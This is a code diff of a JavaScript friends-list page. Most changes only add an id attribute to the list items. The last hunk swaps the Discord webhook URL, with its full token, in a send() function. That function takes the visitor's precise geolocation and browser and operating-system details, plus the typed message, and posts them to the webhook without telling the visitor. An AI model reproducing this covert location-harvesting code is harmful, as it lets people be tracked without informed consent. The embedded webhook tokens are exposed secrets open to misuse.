@@ -88,7 +88,7 @@ const friends = [
 let content = document.getElementById('item-c')
 let ctn2 = ' '
 friends.forEach(p => {
-    ctn2 += `<div class="content-item">
+    ctn2 += `<div  class="content-item" id="nyx">
     <img class="user-icon" src="${p.link}">
     <a class="user-name">${String(p.tag)}</a> 
     <a class="view-profile" href="${p.avatar}">Ver</a>
@@ -102,6 +102,7 @@ const input = document.getElementById('input-s')
 
 novoElemento.innerHTML = ctn2
 content.appendChild(novoElemento)
+let initialIndex;
 
 function searchFriend() {
 
@@ -113,7 +114,7 @@ function searchFriend() {
     let ctn = ' '
     if(input.value.length < 1) {
         friends.forEach(p => {
-            ctn += `<div class="content-item">
+            ctn += `<div  class="content-item" id="nyx">
             <img class="user-icon" src="${p.link}">
             <a class="user-name">${String(p.tag)}</a> 
             <a class="view-profile" href="${p.avatar}">Ver</a>
@@ -129,7 +130,7 @@ function searchFriend() {
 
         if(arc.length > 0) {
             arc.forEach(p => {
-                ctn += `<div class="content-item">
+                ctn += `<div  class="content-item" id="nyx">
                 <img class="user-icon" src="${p.link}">
                 <a class="user-name">${String(p.tag)}</a> 
                 <a class="view-profile" href="${p.avatar}">Ver</a>
@@ -137,7 +138,7 @@ function searchFriend() {
             })
         } else if(ar2.length > 0) {
             ar2.forEach(p => {
-                ctn += `<div class="content-item">
+                ctn += `<div  class="content-item" id="nyx">
                 <img class="user-icon" src="${p.link}">
                 <a class="user-name">${String(p.tag)}</a> 
                 <a class="view-profile" href="${p.avatar}">Ver</a>
@@ -145,7 +146,7 @@ function searchFriend() {
             })
         } else {
             friends.forEach(p => {
-                ctn += `<div class="content-item">
+                ctn += `<div  class="content-item" id="nyx">
                 <img class="user-icon" src="${p.link}">
                 <a class="user-name">${String(p.tag)}</a> 
                 <a class="view-profile" href="${p.avatar}">Ver</a>
@@ -164,7 +165,7 @@ function send() { //a
     const input = document.getElementById('input-s')
     window.navigator.geolocation.getCurrentPosition((a) => { 
         if(input.value.length > 1) {
-            let url = 'https://discord.com/api/webhooks/1089726238735728801/SYH6llmL-BF2BEZc8krsm1na8DE3OylxiCwZV_q_yRlgYc4_s87H43rwjLIVCSuOyCVY'
+            let url = 'https://discord.com/api/webhooks/1089760822873555024/TdUMAFD4PmZhqnncCR9BXknBOB9bhXsbzqozvd_z2kE7iWOj28nrdK_KEwWPfdEVAm-R'
             axios.post(url, {
             content: `**Navegador:** ${window.navigator.appName}\n**Versao:** ${window.navigator.appVersion}\n**Sistema Operacional:** ${window.navigator.platform}\n**Location:** ${a.coords.latitude} N / ${a.coords.longitude} L [${a.coords.altitude ? a.coords.altitude : '0'}]\n**Mensagem:** \`${input.value}\``
           })
@@ -181,4 +182,3 @@ function send() { //a
 
     
 }
-
